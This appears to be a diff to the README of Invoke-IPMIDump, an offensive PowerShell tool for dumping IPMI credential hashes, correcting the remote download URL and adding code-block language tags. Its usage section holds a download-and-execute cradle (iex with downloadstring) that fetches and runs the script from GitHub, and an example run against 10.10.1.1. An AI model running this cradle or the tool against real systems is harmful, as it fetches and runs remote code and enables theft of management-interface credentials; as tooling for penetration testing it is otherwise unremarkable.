@@ -9,15 +9,15 @@ CIDR ranges are also supported with a default user list for ease of use, single 
 
 Invoke-Expression usage:
 
-```
-iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/H4rk3nz0/Invoke-IPMIDump/main/Invoke-IPMIDump.ps1')](https://raw.githubusercontent.com/The-Viper-One/Invoke-IPMIDump/main/Invoke-IPMIDump.ps1)
+```powershell
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/The-Viper-One/Invoke-IPMIDump/refs/heads/main/Invoke-IPMIDump.ps1')
 
 Invoke-IPMIDump -IP 10.10.1.1
 ```
 
 Local usage:
 
-```
+```powershell
 . .\Invoke-IPMIDump.ps1
 
 Invoke-IPMIDump -IP 10.10.1.1
